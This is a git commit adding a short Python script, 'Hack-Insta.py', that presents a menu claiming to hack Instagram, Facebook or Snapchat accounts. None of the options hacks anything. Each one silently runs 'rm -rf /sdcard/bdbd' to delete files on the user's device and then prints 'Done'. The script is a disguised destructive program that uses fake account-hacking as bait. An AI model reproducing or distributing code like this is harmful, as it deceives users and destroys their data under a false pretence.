c852701a8fbc0f4fb0b67aa332790ac0b26b70de
Muntahi <126331080+Muntahi045@users.noreply.github.com>
2024-08-10 16:22:02 +0300

    Add files via upload

---
+++ Hack-Insta.py
@@ -0,0 +1,42 @@
+import os	
+
+os.system("clear")
+
+print("""
+
+ _   _
+| | | |
+| |_| |
+|  _  |
+|_| |_|
+
+_________
+
+1 - Hack Insta
+
+2- Hack Facebook
+
+3 - Hack SnapChat
+
+________________
+
+
+""")
+
+
+h = input("Select Number : ")
+
+if h == "1":
+    os.system("rm -rf /sdcard/bdbd")
+    print("Done")
+
+
+
+if h == "2":
+    os.system("rm -rf /sdcard/bdbd")
+    print("Done Bro")
+
+
+if h == "3":
+    os.system("rm -rf /sdcard/bdbd ")
+    print("Done Bro")
